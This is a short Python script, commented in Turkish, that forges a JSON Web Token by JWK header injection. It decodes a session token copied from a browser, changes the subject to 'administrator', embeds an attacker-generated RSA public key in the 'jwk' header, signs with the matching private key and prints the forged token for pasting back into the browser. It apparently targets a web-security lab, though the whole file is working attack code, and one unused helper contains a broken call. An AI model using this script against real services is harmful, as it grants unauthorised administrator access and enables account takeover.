import jwt
import json
import base64
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# --- AYARLAR ---
# Tarayıcıdan aldığın orijinal 'session' değerini buraya yapıştır
token = 'BURAYA_ORIJINAL_TOKENI_YAPISTIR'

# Step 2: Kendi oluşturduğun anahtarları yükle
with open('public.pem', 'rb') as f:
    public_key = serialization.load_pem_public_key(
        f.read(),
        backend=default_backend()
    )

with open('private.pem', 'rb') as f:
    private_key = serialization.load_pem_private_key(
        f.read(),
        password=None,
        backend=default_backend()
    )

# Step 3: Orijinal token'ı decode et
decoded_token = jwt.decode(token, options={"verify_signature": False})
decoded_header = jwt.get_unverified_header(token)

# Step 4: Kullanıcıyı administrator yap (JWT manipülasyonu)
decoded_token['sub'] = 'administrator'

# Step 5: JWK başlığını (Json Web Key) oluştur
# Sunucunun kabul etmesi için anahtarın n ve e değerlerini Base64URL yapıyoruz
public_numbers = public_key.public_numbers()

def b64url_encode(i):
    # Sayıyı byte'a çevirip base64url formatında kodlayan yardımcı fonksiyon
    length = (i.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(i.to_bytes(length, 'big')).rstrip(b(r'=')).decode('utf-8')

# Python'da direkt 'b' harfi bazen hata verebilir, o yüzden açık yazalım:
def to_base64url(n):
    return base64.urlsafe_b64encode(n.to_bytes((n.bit_length() + 7) // 8, 'big')).decode('utf-8').replace('=', '')

jwk = {
    "kty": "RSA",
    "e": to_base64url(public_numbers.e),
    "kid": decoded_header.get('kid'), # Orijinal kid değerini koruyoruz
    "n": to_base64url(public_numbers.n)
}

# Step 6: Yeni sahte token'ı üret ve imzala
modified_token = jwt.encode(
    decoded_token, 
    private_key, 
    algorithm='RS256', 
    headers={'jwk': jwk, 'kid': decoded_header.get('kid')}
)

print("\n--- MODIFIED HEADER ---")
print(jwt.get_unverified_header(modified_token))
print("\n--- FINAL TOKEN (Bunu Tarayıcıya Yapıştır) ---")
print(modified_token)